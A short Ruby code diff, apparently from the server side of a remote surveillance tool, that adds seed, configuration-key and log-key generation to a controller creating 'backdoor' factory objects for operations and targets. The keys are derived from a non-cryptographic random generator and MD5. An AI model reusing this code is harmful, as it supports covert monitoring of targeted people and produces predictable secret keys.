@@ -2,7 +2,6 @@
 # Controller for the Backdoor objects
 #
 require 'rcs-db/license'
-
 require 'rcs-common/crypt'
 
 module RCS
@@ -50,6 +49,9 @@ class BackdoorController < RESTController
       target = ::Item.targets.find(@params['target'])
       return RESTController.reply.bad_request('INVALID_TARGET') if target.nil?
       
+      # used to generate log/conf keys and seed
+      r = Random.new
+      
       item = Item.create(desc: @params['desc']) do |doc|
         doc[:_kind] = :factory
         doc[:path] = [operation._id, target._id]
@@ -58,6 +60,13 @@ class BackdoorController < RESTController
         doc[:ident] = get_new_ident
         doc[:name] = @params['name']
         doc[:name] ||= doc[:ident]
+        doc[:counter] = 0
+        seed = Digest::MD5.hexdigest(r.rand.to_s).slice(1,12)
+        seed.setbyte(8, 46)
+        doc[:seed] = seed
+        doc[:confkey] = Digest::MD5.hexdigest(r.rand.to_s)
+        doc[:logkey] = Digest::MD5.hexdigest(r.rand.to_s)
+        doc[:upgradable] = false
       end
       
       @session[:accessible] << item._id
